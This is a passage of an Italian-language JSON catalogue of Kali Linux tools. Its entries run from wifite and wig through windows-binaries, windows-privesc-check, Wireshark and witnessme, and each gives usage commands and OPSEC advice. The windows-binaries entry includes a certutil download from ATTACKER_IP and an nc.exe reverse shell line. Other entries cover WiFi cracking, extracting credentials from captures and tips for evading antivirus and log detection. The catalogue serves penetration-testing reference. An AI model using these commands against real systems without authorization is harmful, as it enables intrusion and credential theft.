possono insospettire gli utenti.</p><p><strong>Mitigazioni:</strong> Utilizzare SSID che non confliggano con reti aziendali critiche durante i test. Limitare la potenza di trasmissione per ridurre il raggio d'azione. Documentare ogni sessione di test con timestamp e coordinate per la compliance.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "wifite",
    "name": "wifite",
    "version": "2.7.0",
    "icon": "../app/icons/wifite-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wifite/",
    "desc": "Auditing WiFi automatizzato: scansione, deauth, cattura handshake e crack WPA/WEP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Wifite</strong> è uno strumento automatizzato all-in-one per auditing di reti WiFi che orchestra l'intero processo di attacco wireless dalla scansione al cracking. Analizza automaticamente le reti disponibili, seleziona i target in base a criteri configurabili, esegue gli attacchi più appropriati per ogni tipo di protezione (WEP, WPA, WPA2, WPS) e integra seamlessly con tool di cracking per un workflow completo e hands-off. È il tool preferito per wireless penetration testing rapido ed efficiente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fully Automated Workflow:</strong> gestisce automaticamente l'intero processo di attacco WiFi dalla scansione iniziale alla cattura handshake, selezionando strategie ottimali senza intervento manuale e permettendo di lasciare il tool in esecuzione mentre si lavora su altro.</p><p><strong>Multi-Protocol Attack Support:</strong> supporta attacchi completi per WEP (ARP replay, chopchop, fragmentation, caffe-latte), WPA/WPA2 (deauthentication, PMKID capture), e WPS (Pixie-Dust, Reaver brute force, null PIN) con fallback automatico tra tecniche.</p><p><strong>Smart Target Selection:</strong> seleziona automaticamente gli attacchi più efficaci basandosi sulle caratteristiche del target - potenza segnale, client connessi, WPS enabled, encryption type - prioritizzando target con maggiore probabilità di successo.</p><p><strong>Extensive Tool Integration:</strong> integra nativamente aircrack-ng suite, hashcat, reaver, bully, pixiewps, hcxdumptool, tshark e altri tool specializzati, orchestrando l'esecuzione e parsando automaticamente i risultati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia wifite in modalità interattiva\nsudo wifite\n\n# Target specifico per ESSID\nsudo wifite --essid \"CorporateWiFi\"\n\n# Solo reti WPA/WPA2 (skip WEP e WPS)\nsudo wifite --wpa --no-wps\n\n# Attacca tutti i target continuamente\nsudo wifite --all --infinite\n\n# PMKID attack only (più stealth, no deauth)\nsudo wifite --pmkid --no-deauth\n\n# Con kill timeout e potenza minima\nsudo wifite --kill-timeout 60 --pow 50\n\n# Crack con wordlist custom\nsudo wifite --dict /usr/share/wordlists/rockyou.txt\n\n# Skip cracking, solo capture\nsudo wifite --no-crack --wpa</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Enterprise WiFi Assessment</strong>, condurre assessment automatizzato di sicurezza wireless su reti aziendali, identificando rapidamente access point vulnerabili e catturando materiale per password audit.</p><p>Per <strong>WPA/WPA2 Password Audit</strong>, verificare la robustezza delle passphrase wireless catturando handshake e testando contro wordlist comuni per identificare password deboli.</p><p>Per <strong>WPS Vulnerability Testing</strong>, identificare access point con WPS enabled vulnerabili a Pixie-Dust o brute force, che permettono bypass completo della password WPA.</p><p>Per <strong>Continuous Monitoring</strong>, eseguire scansioni continue durante engagement prolungati per catturare handshake quando client si connettono.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> attacchi deauth e packet injection sono facilmente rilevabili da WIDS enterprise e generano alert immediati. Handshake capture richiede prossimità fisica alla rete target. PMKID attack è più stealth ma comunque rilevabile. Il cracking avviene offline ma gli hash catturati possono essere correlati se leaked. Usare solo su reti autorizzate con permesso esplicito scritto.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "wig-ng",
    "name": "wig-ng",
    "version": "0.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wig-ng/",
    "desc": "Web fingerprinting tool per identificare CMS, framework e componenti web.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Wig-ng</strong> (Web Information Gatherer Next Generation) è un tool di fingerprinting web avanzato che identifica CMS, framework e componenti tecnologiche analizzando risposte HTTP, header, cookie e pattern nel codice HTML. È l'evoluzione di wig originale con database di signature aggiornato, algoritmi di detection migliorati e maggiore accuratezza nell'identificazione di versioni specifiche. Uno strumento essenziale nella fase di reconnaissance per mappare lo stack tecnologico dei target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Comprehensive CMS Detection:</strong> identifica accuratamente WordPress, Joomla, Drupal, Magento, PrestaShop, TYPO3, Concrete5 e decine di altri CMS popolari tramite signature multiple per ridurre falsi positivi.</p><p><strong>Framework Fingerprinting:</strong> riconosce framework backend (Laravel, Django, Rails, Spring, ASP.NET) e frontend (React, Angular, Vue, jQuery) analizzando header caratteristici, file JavaScript e pattern HTML.</p><p><strong>Precise Version Detection:</strong> determina versioni specifiche di software tramite hash di file statici, meta tag, header e changelog per vulnerability matching preciso e ricerca CVE mirata.</p><p><strong>Plugin and Theme Detection:</strong> identifica estensioni, plugin, moduli e temi installati su CMS, rivelando superficie di attacco aggiuntiva spesso trascurata ma frequentemente vulnerabile.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Fingerprint base di un target\nwig-ng http://target.com\n\n# Output verboso con dettagli completi\nwig-ng -v http://target.com\n\n# Salva risultati in formato JSON\nwig-ng -o results.json http://target.com\n\n# Scan con timeout custom\nwig-ng -t 30 http://target.com\n\n# Scan attraverso proxy\nwig-ng --proxy http://127.0.0.1:8080 http://target.com\n\n# Scan di lista URL da file\nwig-ng -f urls.txt -o bulk_results.json\n\n# Solo CMS detection\nwig-ng --cms-only http://target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Application Profiling</strong>, identificare completamente lo stack tecnologico di applicazioni web target come prima fase di un penetration test, mappando CMS, framework e componenti third-party.</p><p>Per <strong>Vulnerability Assessment</strong>, determinare versioni esatte di software per ricerca CVE note su database come NVD, Exploit-DB e Vulners, identificando potenziali vettori di attacco.</p><p>Per <strong>Attack Surface Mapping</strong>, enumerare plugin, temi e moduli installati che rappresentano superficie di attacco aggiuntiva, spesso con vulnerabilità non patchate.</p><p>Per <strong>Bug Bounty Recon</strong>, profilare rapidamente target di programmi bug bounty per identificare tecnologie con history di vulnerabilità frequenti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> request multiple per fingerprinting a path specifici (readme.txt, license.txt, changelog) possono essere loggate e identificate come reconnaissance. User-Agent default è identificabile. Pattern di accesso sequenziale a file caratteristici può triggare alert su WAF. Usare proxy, custom User-Agent e rate limiting per ridurre visibilità durante operazioni stealth.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "wig",
    "name": "wig",
    "version": "0.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wig/",
    "desc": "Identifica CMS e plugin analizzando header, file statici e pattern specifici.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>wig (Web Information Gatherer) e uno strumento di fingerprinting web specializzato nell'identificazione di Content Management System (CMS), framework web e tecnologie server-side. Lo strumento analizza header HTTP, file statici, pagine di errore, meta tag e pattern specifici per determinare quale CMS e quali plugin sono in uso sul sito target. wig confronta le risposte del server con un database interno di firme per identificare versioni specifiche di WordPress, Joomla, Drupal, Magento e decine di altri CMS. A differenza di scanner piu aggressivi, wig adotta un approccio passivo e discreto che genera un volume di traffico relativamente ridotto. Lo strumento e scritto in Python e produce report strutturati con le tecnologie identificate e le relative versioni.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Fingerprinting CMS avanzato:</strong> wig identifica CMS e relative versioni analizzando hash di file statici (CSS, JavaScript, immagini), header HTTP specifici e pattern nelle pagine HTML. Il database di firme copre decine di CMS tra cui WordPress, Joomla, Drupal, Magento, phpBB e molti altri. L'identificazione della versione esatta permette di ricercare vulnerabilita note specifiche per quella release.</p><p><strong>Rilevamento plugin e temi:</strong> Oltre al CMS principale, wig identifica plugin, temi e moduli installati analizzando percorsi URL, file JavaScript e CSS specifici. I plugin rappresentano spesso la superficie di attacco piu ampia di un CMS e la loro identificazione e cruciale per il vulnerability assessment. Lo strumento rileva anche versioni obsolete di plugin con vulnerabilita note.</p><p><strong>Rilevamento tecnologie server:</strong> wig identifica tecnologie server-side come versioni di PHP, server web (Apache, NGINX, IIS), framework applicativi e librerie JavaScript frontend. L'analisi degli header Server, X-Powered-By e di altri indicatori fornisce un quadro completo dello stack tecnologico. Queste informazioni sono fondamentali per la pianificazione di attacchi mirati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>wig si utilizza da linea di comando specificando l'URL target e le opzioni di scansione desiderate.</p><pre><code># Scansione base di un sito web\nwig http://example.com\n\n# Scansione con output dettagliato\nwig -v http://example.com\n\n# Scansione con numero di thread specificato\nwig -t 20 http://example.com\n\n# Scansione di URL multipli da file\nwig -l targets.txt</code></pre><p>I risultati mostrano il CMS identificato, la versione, i plugin rilevati e le tecnologie server. Lo strumento evidenzia anche eventuali versioni con vulnerabilita note nel suo database.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella fase di ricognizione di un penetration test web, wig viene utilizzato per identificare rapidamente il CMS e i plugin installati su un sito target, permettendo di focalizzare la ricerca di vulnerabilita sulle componenti specifiche rilevate. Durante assessment di grandi infrastrutture web con centinaia di siti, lo strumento permette di categorizzare automaticamente le tecnologie in uso e prioritizzare i target in base alla presenza di versioni obsolete o vulnerabili. wig e utile anche per verificare la presenza di CMS non dichiarati o nascosti dietro pagine personalizzate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le richieste di fingerprinting accedono a percorsi tipici dei CMS (come /wp-login.php, /administrator/) che possono essere monitorati da honeypot e sistemi di rilevamento. Il pattern di richieste multiple a file statici specifici puo essere identificato da WAF avanzati.</p><p><strong>Impatto operativo:</strong> wig genera un volume di traffico moderato ma con pattern riconoscibili. Le richieste a file inesistenti generano errori 404 che vengono registrati nei log del server.</p><p><strong>Mitigazioni:</strong> Rallentare la velocita delle richieste per mimetizzarsi nel traffico normale. Utilizzare user-agent di browser legittimi. Combinare con la navigazione manuale del sito per ridurre la riconoscibilita del pattern automatizzato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "windows-binaries",
    "name": "windows-binaries",
    "version": "0.6.10",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/windows-binaries/",
    "desc": "Collezione binari Windows per pentesting: nc, wget, plink, accesschk e altri.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Windows-binaries e una collezione di eseguibili Windows precompilati inclusi in Kali Linux, progettati per essere trasferiti su sistemi Windows durante attivita di penetration testing. La collezione include strumenti essenziali come Netcat (nc.exe), wget, curl, PuTTY/Plink, accesschk, whoami e altri utility utilizzati frequentemente nella fase di post-exploitation su sistemi Windows. Questi binari sono gia compilati e pronti all'uso, eliminando la necessita di avere un compilatore sul sistema target. La raccolta rappresenta un toolkit portatile per operazioni su sistemi Windows dove non e possibile installare software aggiuntivo. I binari sono organizzati per funzionalita e sono immediatamente accessibili dalla directory di installazione di Kali.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Strumenti di rete:</strong> La collezione include Netcat (nc.exe) per connessioni TCP/UDP, trasferimento file e bind/reverse shell. Sono presenti anche wget.exe e curl.exe per il download di file da linea di comando, essenziali per il trasferimento di tool aggiuntivi sul target. Plink.exe (PuTTY Link) permette di stabilire tunnel SSH e connessioni remote sicure da sistemi Windows.</p><p><strong>Utility di enumerazione:</strong> accesschk.exe di Sysinternals permette di verificare permessi su file, directory, servizi e chiavi di registro per identificare misconfiguration di privilege escalation. whoami.exe fornisce informazioni sull'utente corrente, gruppi e privilegi. Questi strumenti sono fondamentali per la fase di enumerazione locale dopo aver ottenuto accesso iniziale.</p><p><strong>Portabilita e compatibilita:</strong> Tutti i binari sono compilati staticamente e non richiedono librerie aggiuntive o installazione, funzionando su qualsiasi versione di Windows. I file sono di dimensioni contenute per facilitare il trasferimento attraverso canali limitati come shell reverse con banda ridotta. La collezione copre le necessita piu comuni senza richiedere compilazione sul target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>I binari vengono trasferiti sul sistema Windows target e eseguiti direttamente dalla linea di comando.</p><pre><code># Localizzare i binari in Kali\nls /usr/share/windows-binaries/\n\n# Trasferire nc.exe via web server Python\npython3 -m http.server 8080\n# Sul target Windows:\n# certutil -urlcache -f http://ATTACKER_IP:8080/nc.exe nc.exe\n\n# Creare una reverse shell con nc.exe (sul target)\n# nc.exe ATTACKER_IP 4444 -e cmd.exe\n\n# Verificare permessi con accesschk\n# accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula</code></pre><p>I binari possono essere trasferiti tramite diverse tecniche: SMB share, HTTP download, codifica Base64 in PowerShell o attraverso la sessione Meterpreter esistente.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Dopo aver ottenuto una shell iniziale su un sistema Windows, i binari della collezione vengono trasferiti per stabilire un canale di comunicazione piu stabile con nc.exe, permettendo sessioni interattive e trasferimento file bidirezionale. Durante la fase di privilege escalation, accesschk.exe viene utilizzato per enumerare servizi con permessi deboli e directory scrivibili che possono essere sfruttati per elevare i privilegi. In scenari dove il target non ha accesso a internet, wget.exe e plink.exe permettono di stabilire tunnel attraverso la rete interna per raggiungere risorse aggiuntive.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Molti dei binari inclusi nella collezione sono noti agli antivirus e vengono rilevati come potenziali strumenti di hacking, in particolare nc.exe che e frequentemente flaggato come backdoor. Il trasferimento di eseguibili tramite certutil o PowerShell genera eventi nei log di sicurezza di Windows.</p><p><strong>Impatto operativo:</strong> L'esecuzione di binari non firmati puo attivare Windows SmartScreen e AppLocker se configurati. I binari lasciati sul filesystem rappresentano artefatti forensi facilmente identificabili.</p><p><strong>Mitigazioni:</strong> Rinominare i binari prima del trasferimento per evitare rilevamento basato sul nome file. Utilizzare directory temporanee e rimuovere i binari dopo l'uso. Considerare l'uso di LOLBins (Living Off The Land Binaries) nativi di Windows come alternativa dove possibile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "windows-privesc-check",
    "name": "windows-privesc-check",
    "version": "2.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/windows-privesc-check/",
    "desc": "Script per trovare misconfiguration di privilege escalation su sistemi Windows.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Windows-privesc-check e uno script progettato per identificare misconfiguration di sicurezza su sistemi Windows che possono essere sfruttate per privilege escalation. Lo strumento analizza permessi su servizi, file, directory, chiavi di registro, task schedulati e altri componenti del sistema operativo alla ricerca di configurazioni deboli. Windows-privesc-check viene eseguito direttamente sul sistema target e produce un report dettagliato con le vulnerabilita identificate e il potenziale impatto. Lo script non richiede privilegi amministrativi per l'esecuzione, poiche verifica le configurazioni accessibili all'utente corrente. Il tool e particolarmente utile nella fase di post-exploitation quando si dispone di un accesso a basso privilegio e si cerca di elevare i permessi.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Analisi permessi servizi:</strong> Lo script verifica i permessi su tutti i servizi Windows installati, identificando quelli dove l'utente corrente puo modificare il binario, il percorso o la configurazione del servizio. Servizi con permessi eccessivi rappresentano uno dei vettori piu comuni di privilege escalation su Windows. Il tool identifica anche servizi con percorsi non quotati (unquoted service paths) che possono essere sfruttati per DLL hijacking.</p><p><strong>Controllo filesystem e registro:</strong> Windows-privesc-check analizza i permessi su directory critiche del sistema, cartelle di programmi e chiavi di registro sensibili. Identifica directory scrivibili nel PATH di sistema dove possono essere inseriti binari malevoli per DLL hijacking. Verifica anche i permessi su file di configurazione e script di avvio automatico che possono essere modificati per ottenere esecuzione con privilegi elevati.</p><p><strong>Enumerazione task schedulati e autorun:</strong> Lo script esamina i task schedulati verificando se l'utente corrente puo modificare gli script o i binari eseguiti da task con privilegi SYSTEM. Analizza anche le chiavi di autorun nel registro e le cartelle di startup alla ricerca di entry modificabili. Questa analisi copre i vettori di persistence e privilege escalation basati su esecuzione automatica.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lo script viene trasferito sul sistema Windows target e eseguito dalla linea di comando.</p><pre><code># Trasferire lo script sul target\n# Dal Kali: python3 -m http.server 8080\n# Sul target: certutil -urlcache -f http://ATTACKER/windows-privesc-check2.exe wpc.exe\n\n# Esecuzione base con output a console\nwindows-privesc-check2.exe --dump -G\n\n# Esecuzione con report HTML\nwindows-privesc-check2.exe --dump -G --outputfile report.html\n\n# Analisi completa con tutti i controlli\nwindows-privesc-check2.exe --audit -a -G</code></pre><p>Il report generato elenca le misconfiguration trovate con livello di severita, descrizione della vulnerabilita e suggerimenti per lo sfruttamento. E consigliabile eseguire lo script con l'utente a basso privilegio per ottenere risultati rilevanti per l'escalation.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Dopo aver ottenuto accesso a un sistema Windows come utente non privilegiato tramite una webshell o una reverse shell, windows-privesc-check viene eseguito per identificare sistematicamente tutti i vettori di privilege escalation disponibili, come servizi con permessi deboli o unquoted paths. In assessment di hardening Windows, lo script viene utilizzato dal blue team per verificare la corretta configurazione dei permessi su servizi, file system e registro prima del deployment in produzione. Lo strumento e anche utilizzato in CTF e laboratori di formazione per imparare le tecniche di privilege escalation su Windows in modo sistematico.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'esecuzione dello script genera numerose query al sistema operativo per enumerare permessi su servizi, file e registro, attivita che puo essere rilevata da soluzioni EDR e SIEM. Il binario stesso puo essere identificato dall'antivirus come strumento di hacking.</p><p><strong>Impatto operativo:</strong> Lo script e di sola lettura e non modifica il sistema, ma l'intensa attivita di enumerazione puo generare un volume significativo di eventi nei log di sicurezza. L'esecuzione puo richiedere alcuni minuti durante i quali l'attivita del processo e visibile nel task manager.</p><p><strong>Mitigazioni:</strong> Rinominare il binario prima dell'esecuzione per evitare rilevamento basato sul nome. Eseguire in orari di alta attivita per mimetizzarsi nel rumore di fondo. Eliminare il binario e i report generati dopo l'analisi. Considerare l'uso di script PowerShell equivalenti come alternativa meno rilevabile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Windows"
    ],
    "notes": null
  },
  {
    "id": "wireshark-kali",
    "name": "wireshark",
    "version": "4.4.7",
    "icon": "../app/icons/wireshark-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wireshark/",
    "desc": "Analizzatore di protocolli di rete leader: cattura, dissect e analisi pacchetti GUI.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Wireshark e l'analizzatore di protocolli di rete piu diffuso e completo al mondo, utilizzato per la cattura e l'analisi dettagliata del traffico di rete in tempo reale. Lo strumento offre un'interfaccia grafica potente che permette di esaminare centinaia di protocolli con dissector specializzati, dal livello fisico fino al livello applicativo. Wireshark supporta la cattura su interfacce Ethernet, WiFi, USB e molte altre, con filtri di cattura e visualizzazione avanzati per isolare il traffico di interesse. Il progetto e open-source e rappresenta lo standard de facto per l'analisi di rete sia in contesti di cybersecurity che di troubleshooting. In Kali Linux, Wireshark e integrato come strumento fondamentale per l'analisi del traffico durante penetration test, forensics di rete e debugging di protocolli.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Cattura e dissection multi-protocollo:</strong> Wireshark supporta la decodifica di oltre 3000 protocolli di rete con dissector che scompongono ogni pacchetto nei suoi campi costitutivi. La cattura avviene in tempo reale su qualsiasi interfaccia di rete con supporto per filtri BPF che limitano il traffico catturato. I pacchetti vengono presentati in una gerarchia a livelli che mostra dal frame Ethernet fino al payload applicativo.</p><p><strong>Filtri di visualizzazione potenti:</strong> Il linguaggio di filtri di visualizzazione permette di isolare traffico specifico con espressioni complesse che combinano protocollo, indirizzo, porta, contenuto e stato della connessione. I filtri possono essere combinati con operatori logici e salvati come profili riutilizzabili. La funzione Follow TCP/UDP Stream ricostruisce intere conversazioni per analisi del contenuto applicativo.</p><p><strong>Analisi statistica e forensic:</strong> Wireshark include strumenti di analisi statistica come conversation statistics, protocol hierarchy, IO graphs e flow graphs per visualizzare pattern nel traffico. La funzione Expert Info identifica automaticamente anomalie, errori e problemi di performance. Il supporto per file pcap/pcapng permette l'analisi offline di catture fornite da terze parti per indagini forensi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Wireshark si utilizza sia tramite interfaccia grafica che tramite tshark per cattura e analisi da linea di comando.</p><pre><code># Avvio interfaccia grafica\nwireshark\n\n# Cattura da linea di comando con tshark\ntshark -i eth0 -w cattura.pcap\n\n# Cattura con filtro BPF\ntshark -i eth0 -f \"host 192.168.1.100 and port 80\" -w http_traffic.pcap\n\n# Analisi offline con filtro di visualizzazione\ntshark -r cattura.pcap -Y \"http.request.method == POST\" -T fields -e http.host -e http.request.uri\n\n# Estrazione di credenziali in chiaro\ntshark -r cattura.pcap -Y \"http.authbasic\" -T fields -e http.authbasic</code></pre><p>Per la cattura su interfacce di rete e necessario eseguire Wireshark con privilegi appropriati o configurare le capabilities di dumpcap. I file di cattura possono raggiungere dimensioni considerevoli e richiedono spazio disco adeguato.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante penetration test, Wireshark viene utilizzato per catturare e analizzare traffico di rete dopo aver eseguito ARP spoofing o MITM, identificando credenziali trasmesse in chiaro, cookie di sessione e dati sensibili non cifrati. In attivita di network forensics, le catture pcap vengono analizzate per ricostruire la cronologia di un incidente di sicurezza, identificando comunicazioni C2, exfiltration di dati e movimenti laterali. Wireshark e fondamentale anche per il debugging di exploit e tool custom, permettendo di analizzare il traffico generato e verificare il corretto funzionamento dei payload a livello di protocollo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La cattura passiva di traffico sulla propria interfaccia non genera traffico aggiuntivo e non e direttamente rilevabile. Tuttavia, l'attivazione della modalita promiscua sull'interfaccia di rete puo essere rilevata da sistemi di monitoraggio di rete e da altri host sullo stesso segmento.</p><p><strong>Impatto operativo:</strong> La cattura prolungata genera file di grandi dimensioni che possono esaurire lo spazio disco. L'analisi di catture molto grandi richiede risorse di memoria significative. Le catture contengono dati sensibili che devono essere protetti adeguatamente.</p><p><strong>Mitigazioni:</strong> Utilizzare filtri di cattura BPF per limitare il traffico registrato solo a quello rilevante. Cifrare e proteggere i file di cattura contenenti dati sensibili. Eliminare le catture al termine dell'analisi e documentare la retention dei dati secondo le policy dell'engagement.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "witnessme",
    "name": "witnessme",
    "version": "1.5.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/witnessme/",
    "desc": "Screenshot web automatico per visual recon di applicazioni e servizi HTTP/HTTPS.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WitnessMe e uno strumento di visual recon progettato per catturare screenshot automatici di applicazioni web e servizi HTTP/HTTPS su larga scala. Lo strumento utilizza un browser headless per navigare verso gli URL target e salvare screenshot delle pagine renderizzate, permettendo una rapida valutazione visiva della superficie di attacco web. WitnessMe supporta l'input da file di testo, output di Nmap e risultati di altri scanner per processare centinaia o migliaia di URL in modo automatizzato. I risultati vengono presentati in un'interfaccia web navigabile con thumbnail, informazioni sui server e funzionalita di ricerca e filtraggio. Lo strumento e particolarmente utile nelle fasi iniziali di ricognizione per identificare rapidamente applicazioni interessanti in grandi reti.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Screenshot automatico su larga scala:</strong> WitnessMe cattura screenshot di pagine web utilizzando un browser headless Chromium che renderizza JavaScript, CSS e contenuto dinamico come un browser reale. Lo strumento gestisce timeout, redirect, errori SSL e pagine non responsive in modo robusto. Supporta la cattura parallela con configurazione del numero di worker per bilanciare velocita e risorse.</p><p><strong>Integrazione con scanner:</strong> Lo strumento accetta input da diverse fonti tra cui file di testo con URL, output XML di Nmap e risultati di masscan. Questa integrazione permette di alimentare WitnessMe direttamente con i risultati della fase di port scanning per una transizione fluida alla visual recon. Supporta anche range CIDR per la scansione di intere sottoreti su porte web comuni.</p><p><strong>Interfaccia di reporting:</strong> I risultati vengono salvati in un database SQLite e presentati tramite un'interfaccia web locale con thumbnail navigabili, filtri per tecnologia e funzionalita di ricerca. L'interfaccia permette di identificare rapidamente pannelli di login, applicazioni default e pagine di errore. E possibile esportare i risultati in formato CSV per integrazione con altri strumenti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>WitnessMe si utilizza per catturare screenshot da URL singoli, file di lista o output di scanner.</p><pre><code># Screenshot di un singolo URL\nwitnessme screenshot https://example.com\n\n# Screenshot da file di URL\nwitnessme screenshot targets.txt\n\n# Screenshot da range CIDR\nwitnessme screenshot 192.168.1.0/24\n\n# Avvio interfaccia web per consultare i risultati\nwitnessme viewer\n\n# Screenshot con output di Nmap\nwitnessme screenshot nmap_scan.xml</code></pre><p>I risultati vengono salvati nella directory corrente in un database SQLite con gli screenshot associati. L'interfaccia viewer e accessibile tramite browser sulla porta locale configurata.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la ricognizione di reti enterprise con centinaia di servizi web, WitnessMe cattura screenshot di tutti gli host con porte HTTP/HTTPS aperte, permettendo di identificare visivamente pannelli di amministrazione, applicazioni legacy e servizi misconfigured senza visitare manualmente ogni URL. In programmi di bug bounty con scope ampio, lo strumento accelera la fase di discovery identificando applicazioni web non documentate o dimenticate che rappresentano spesso i target piu vulnerabili. WitnessMe e utile anche per documentare lo stato dei servizi web durante audit di sicurezza, creando un inventario visivo dell'infrastruttura esposta.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le richieste HTTP/HTTPS generate dal browser headless hanno user-agent e fingerprint riconoscibili che possono essere identificati da WAF e sistemi di monitoraggio. La scansione sequenziale di molti URL sullo stesso target genera pattern di traffico anomali.</p><p><strong>Impatto operativo:</strong> Lo strumento stabilisce connessioni TCP complete verso ogni URL target, lasciando tracce nei log del server web. La cattura di screenshot di pagine con contenuto dinamico potrebbe attivare funzionalita di tracking o analytics.</p><p><strong>Mitigazioni:</strong> Personalizzare lo user-agent per imitare browser legittimi. Distribuire le richieste nel tempo per evitare rate limiting e rilevamento. Utilizzare proxy o VPN per mascherare l'origine delle connessioni. Verificare che lo scope includa tutti gli URL prima della scansione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Visual_Recon"
    ],
    "notes": null
  },
  {
    "id": "wordlistraider",
    "name": "wordlistraider",
    "version": "1.0~git20200927",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/wordlistraider/",
    "desc": "Combina e ottimizza wordlist multiple rimuovendo duplicati e normalizzando.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WordlistRaider e uno strumento per la gestione e l'ottimizzazione di wordlist utilizzate in attacchi di password cracking e brute-forcing. Lo strumento combina wordlist multiple, rimuove duplicati, normalizza il formato e applica filtri per creare liste ottimizzate e personalizzate. WordlistRaider e progettato per lavorare con grandi volumi di dati, processando milioni di righe in modo efficiente. Lo strumento supporta operazioni di filtraggio avanzate basate su lunghezza, caratteri, pattern e regex per creare wordlist mirate per target specifici. Nel contesto del penetration testing, wordlist di qualita rappresentano un fattore critico per il successo di attacchi di forza bruta e l'ottimizzazione riduce significativamente il tempo necessario.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Combinazione e deduplicazione:</strong> WordlistRaider unisce wordlist da fonti multiple eliminando automaticamente i duplicati per creare una lista unica e completa. Il processo di deduplicazione utilizza algoritmi efficienti in memoria per gestire file di grandi dimensioni senza esaurire la RAM. Supporta la lettura da file multipli, stdin e directory intere contenenti wordlist.</p><p><strong>Filtraggio avanzato:</strong> Lo strumento offre filtri basati su lunghezza minima e massima delle parole, presenza o assenza di caratteri specifici, pattern regex e encoding. E possibile filtrare per complessita della password (maiuscole, numeri, caratteri speciali) per creare liste che rispettino le policy di password del target. I filtri possono essere combinati in catena per un raffinamento progressivo.</p><p><strong>Normalizzazione e trasformazione:</strong> WordlistRaider puo normalizzare le wordlist convertendo encoding, rimuovendo caratteri di controllo e uniformando le terminazioni di riga. Supporta trasformazioni come la conversione di case, l'aggiunta di prefissi/suffissi e la sostituzione di caratteri. Queste operazioni permettono di adattare le wordlist al contesto specifico del target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>WordlistRaider si utilizza da linea di comando per processare e 